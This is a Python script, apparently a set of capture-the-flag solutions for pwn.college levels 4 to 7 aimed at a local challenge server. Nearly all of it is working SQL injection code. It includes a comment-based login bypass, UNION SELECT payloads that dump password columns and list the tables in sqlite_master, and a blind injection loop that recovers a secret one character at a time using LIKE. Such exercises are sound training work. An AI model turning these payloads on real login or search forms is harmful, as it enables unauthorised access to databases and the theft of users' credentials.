#!/usr/bin/env python

import requests

def get_POST_result(url = 'http://challenge.localhost:80', data = None, print_out = True):
    response = requests.post(url, data)
    if(print_out):
        print(response.text)
    return response.text

def lv_4():
    data = {
        'username': 'flag";--',
        'password': '123'
    }
    get_POST_result(data = data)

def get_GET_result(url = 'http://challenge.localhost:80', args = '', print_out = True):
    response = requests.get(url + args)
    if(print_out):
        print(response.text)
    return response.text

def lv_5():
    get_GET_result(args = '?query=%" UNION ALL SELECT password FROM users; --')

def lv_6():
    response_str = get_GET_result(args = '?query=%" UNION ALL SELECT name FROM sqlite_master WHERE type=\'table\'; --')
    table_name = response_str.split('\n')[-2]
    get_GET_result(args = '?query=%" UNION ALL SELECT password FROM ' + table_name + '; --')

def lv_7():
    flag_prefix = 'pwn.college{'
    while(True):
        break_while = True
        for i in range(1, 128):
            ch = chr(i)
            if(ch == '%'):
                continue
            cur_prefix = flag_prefix + ch
            data = {
                'username': 'no" UNION ALL SELECT rowid, rowid, rowid FROM users WHERE password LIKE "' + cur_prefix + '%"; --',
                'password': '123'
            }
            res = get_POST_result(data = data, print_out = False)
            if('Hello' in res):
                flag_prefix = cur_prefix
                print(flag_prefix)
                break_while = False
                break
        if(break_while):
            break
    if(flag_prefix[-1] != '}'):
        flag_prefix = flag_prefix + '}'
    print(flag_prefix)
